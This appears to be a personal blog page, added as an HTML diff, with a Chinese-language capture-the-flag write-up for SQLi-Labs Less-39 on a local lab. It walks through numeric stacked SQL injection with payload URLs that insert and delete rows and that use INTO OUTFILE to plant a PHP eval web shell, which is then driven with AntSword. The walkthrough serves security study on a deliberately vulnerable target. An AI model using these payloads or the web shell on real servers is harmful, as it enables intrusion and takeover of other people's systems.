@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-39 数字型堆叠注入与 WebShell Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-39 数字型堆叠注入与 WebShell Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 堆叠注入, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-39 (GET - Stacked Query Injection - Intiger based)</li>
+        <li><strong>提示：</strong>数字型注入，后端使用 <code>mysqli_multi_query()</code> 支持堆叠执行。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡与 Less-38 同样支持堆叠注入。源码中 SQL 语句为 <code>id=$id</code>，属于纯数字型注入，无需使用单引号进行闭合。因此，堆叠注入的分号 <code>;</code> 可以直接拼接在数字之后。</p>
+    <p>由于页面仅处理并回显第一条 <code>SELECT</code> 查询结果，后续的堆叠语句属于“盲执行”状态，需通过外部副作用（如写入新用户、写入文件）来验证执行结果。本关利用 <code>INTO OUTFILE</code> 语句将恶意 PHP 代码写入服务器物理目录，配合中国蚁剑获取控制权。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：验证堆叠与副作用（盲执行测试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1; insert into users(id,username,password) values(999,'pwn39','pwn39')-- -</code></p>
+    <p><strong>验证：</strong>访问 <code>?id=999</code>，页面显示 <code>Your Username is : pwn39</code>，证明插入语句已被成功执行。</p>
+    <p><em>清理测试数据：</em><code>?id=1; delete from users where id=999-- -</code></p>
+
+    <p><strong>第二步：写入 WebShell</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1; select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-39/shell.php'-- -</code></p>
+    <p><strong>解释：</strong>直接拼接分号与 <code>INTO OUTFILE</code>，将一句话木马写入目标目录。</p>
+
+    <p><strong>第三步：中国蚁剑连接</strong></p>
+    <p>AntSword 的具体连接配置操作步骤与 Less-38 完全一致，此处不再重复赘述。仅在添加数据时，修改以下必要参数：</p>
+    <ul>
+        <li><strong>URL 地址：</strong><code>http://localhost/sqli-labs-master/Less-39/shell.php</code></li>
+        <li><strong>连接密码：</strong><code>cmd</code></li>
+    </ul>
+    <p>连接成功后，即可在文件管理界面浏览、修改目标服务器文件。</p>
+
+    <h2>4. 复盘与注意事项</h2>
+    <ul>
+        <li><strong>盲执行验证：</strong>堆叠注入的 <code>INSERT</code> 或 <code>OUTFILE</code> 不会在当前页面回显，必须通过二次访问新数据或去本地物理路径查看文件是否生成，来确认命令是否真正执行。</li>
+        <li><strong>数字型思维定势：</strong>由于刚打完 L38（单引号字符型），在 L39 极易顺手输入单引号去闭合，导致语法报错。必须严格根据“未过滤且提示 numeric value”判断为纯数字型。</li>
+        <li><strong>Windows 路径规范：</strong>在 <code>INTO OUTFILE</code> 写入文件时，Windows 下的路径必须使用正斜杠 <code>/</code> 或双反斜杠 <code>\\</code>，直接写单反斜杠 <code>\</code> 会被当作转义字符导致写入失败。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>数字型堆叠注入</strong>：无需闭合引号，使用分号直接截断并执行新语句。</li>
+        <li><strong>INTO OUTFILE</strong>：利用数据库的高权限，将查询结果（恶意代码）写入系统文件，实现从 SQL 注入到服务器控制的提权。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
